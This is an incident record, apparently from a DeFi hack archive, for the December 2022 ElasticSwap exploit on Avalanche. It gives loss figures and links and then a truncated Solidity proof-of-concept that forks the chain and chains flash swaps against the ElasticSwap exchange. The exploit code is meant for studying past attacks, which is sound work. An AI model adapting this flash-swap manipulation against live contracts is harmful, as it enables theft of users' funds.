# [?] - ElasticSwap - Business Logic Flaw

## Summary
Severity: Unknown
Chain: Avalanche
Component: ElasticSwap
Published: 2022-12-13
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/ElasticSwap_exp.sol
Type: defi-exploit-poc

## Details
Lost: $845k
References:
- https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a
- https://etherscan.io/tx/0xb36486f032a450782d5d2fac118ea90a6d3b08cac3409d949c59b43bcd6dbb8f

```solidity
contract ContractTest is Test {
    IERC20 TIC = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);
    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    Uni_Pair_V2 SPair = Uni_Pair_V2(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    Uni_Pair_V2 JPair = Uni_Pair_V2(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);
    ELPExchange ELP = ELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("avalanche", 23_563_709);
    }

    function testExploit() public {
        TIC.approve(address(ELP), type(uint256).max);
        USDC_E.approve(address(ELP), type(uint256).max);
        ELP.approve(address(ELP), type(uint256).max);
        SPair.swap(51_112 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDC.E balance after exploit", USDC_E.balanceOf(address(this)), USDC_E.decimals()
        );
        emit log_named_decimal_uint("Attacker TIC balance after exploit", TIC.balanceOf(address(this)), TIC.decimals());
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1));
        TIC.transfer(address(SPair), 51_624 * 1e18);
    }

    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        uint256 TICAmount = TIC.balanceOf(address(ELP));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/ElasticSwap_exp.sol_
